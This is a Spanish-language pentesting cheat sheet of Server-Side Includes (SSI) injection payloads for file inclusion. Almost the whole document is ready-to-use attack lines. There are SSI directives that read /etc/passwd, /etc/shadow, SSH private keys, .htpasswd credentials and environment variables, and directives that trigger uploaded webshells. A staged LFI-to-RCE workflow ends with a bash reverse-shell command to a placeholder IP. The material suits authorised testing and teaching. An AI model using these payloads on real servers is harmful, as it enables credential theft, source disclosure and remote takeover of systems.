---
aliases:
  - SSI include virtual
  - SSI file include
  - SSI LFI
tags:
  - vuln/ssi
  - vuln/lfi
  - technique/collection
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[Server-Side Includes (SSI) Injection]]"
---
# SSI - Inclusión de Archivos

---

## `#include virtual` (URL-Relative)

| **Comando** | **Qué obtenés** | **Cuándo** |
|---|---|---|
| `<!--#include virtual="/admin/config.php" -->` | Contenido del recurso (ejecutado si hay handler) | Path relativo al webroot |
| `<!--#include virtual="/another.shtml" -->` | SSI recursivo (parsea el incluido) | Encadenar SSI |
| `<!--#include virtual="/cgi-bin/test.cgi" -->` | Ejecuta el CGI y embebe su salida | Pivot a RCE vía CGI |
| `<!--#include virtual="/page.cgi?param=value" -->` | CGI con argumentos | Pasar params al CGI |
| `<!--#include virtual="../../../../etc/passwd" -->` | Lectura fuera del webroot | Path traversal |
| `<!--#include virtual="/uploads/shell.shtml" -->` | Ejecuta el SSI subido | Cadena RCE vía upload |
| `<!--#include virtual="/uploads/shell.php" -->` | Ejecuta el PHP subido | Si co-existe handler PHP |

^ssi-include-virtual

> [!note] `virtual` pasa por los handlers de URL (PHP/CGI se ejecutan) y respeta auth/ACLs, pero cuesta escapar del webroot. Encodear `/` como `%2F` puede saltear filtros simples.

---

## `#include file` (Filesystem-Relative)

| **Comando** | **Qué obtenés** | **Cuándo** |
|---|---|---|
| `<!--#include file="/etc/passwd" -->` | Usuarios del sistema (crudo) | Lectura directa |
| `<!--#include file="/etc/shadow" -->` | Hashes de contraseñas | Si corre como root |
| `<!--#include file="/var/www/html/config.php" -->` | Source del config SIN ejecutar | Source disclosure |
| `<!--#include file="/home/user/.ssh/id_rsa" -->` | Clave SSH privada | Si es legible |
| `<!--#include file="/proc/self/environ" -->` | Variables de entorno del proceso | Env del webserver |
| `<!--#include file="../../etc/passwd" -->` | Lectura por traversal relativo | Escapar el dir actual |
| `<!--#include file="/etc/apache2/apache2.conf" -->` | Config de Apache | Mapear el server |
| `<!--#include file="/etc/apache2/.htpasswd" -->` | Credenciales de Basic Auth | Si es legible |
| `<!--#include file="/var/www/html/index.php.bak" -->` | Source de un backup | Source disclosure |

^ssi-include-file

### Diferencias `virtual` vs `file`

```
virtual=       URL-relative
               Triggers handlers (PHP, CGI executed)
               Respects auth/ACLs
               Cannot escape webroot easily

file=          Filesystem-relative
               Raw file content (no execution)
               No auth check
               Can escape webroot via traversal
               May not follow symlinks
```

---

## LFI Chain via SSI

| **Comando** | **Qué obtenés** | **Cuándo** |
|---|---|---|
| `<!--#include file="/var/www/html/admin.php" -->` | Source con creds de DB / endpoints internos | Stage 1: source disclosure |
| `<!--#include file="/home/devuser/.ssh/id_rsa" -->` | Clave SSH para acceso directo | Stage 2: si es legible |
| `<!--#include virtual="/uploads/shell.php" -->` | Dispara la webshell subida (PHP) | Stage 5: RCE tras upload |
| `<!--#include file="/.git/config" -->` | Internals de git (remotes/creds) | Source disclosure |
| `<!--#include file="/proc/self/cmdline" -->` | Línea de comando del proceso | Recon del proceso |
| `<!--#fsize file="/etc/passwd" -->` | Existencia/tamaño SIN leer contenido | Probe cuando `#include` está bloqueado |

^ssi-include-lfi-chain

### Workflow LFI to RCE chain

```html
<!-- Stage 1: Read app source -->
<!--#include file="/var/www/html/admin.php" -->
<!-- Identifies: DB creds, internal endpoints, sensitive paths -->

<!-- Stage 2: Read SSH key if accessible -->
<!--#include file="/home/devuser/.ssh/id_rsa" -->

<!-- Stage 3: Upload webshell via file upload (different vector) -->
<!-- Upload shell.php via /upload endpoint -->

<!-- Stage 4: Trigger via include virtual (handler PHP) -->
<!--#include virtual="/uploads/shell.php?cmd=id" -->

<!-- Stage 5: Or chain a #exec si NOEXEC not set -->
<!--#exec cmd="bash -c 'bash -i >& /dev/tcp/IP/4444 0>&1'" -->
```

---
